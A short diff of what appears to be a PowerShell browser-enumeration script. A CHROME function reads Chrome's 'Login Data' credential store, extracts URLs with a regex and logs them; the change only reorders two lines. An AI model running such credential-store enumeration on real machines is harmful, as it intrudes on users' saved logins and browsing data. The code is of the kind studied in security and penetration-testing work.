@@ -764,8 +764,8 @@ function CHROME {
         If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
             echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
         }else{
-            $ReadData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
             $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+            $ReadData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
             $Json = Get-Content -Path "$ReadData"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique
             echo $Json >> $LogFilePath\BrowserEnum.log
         }
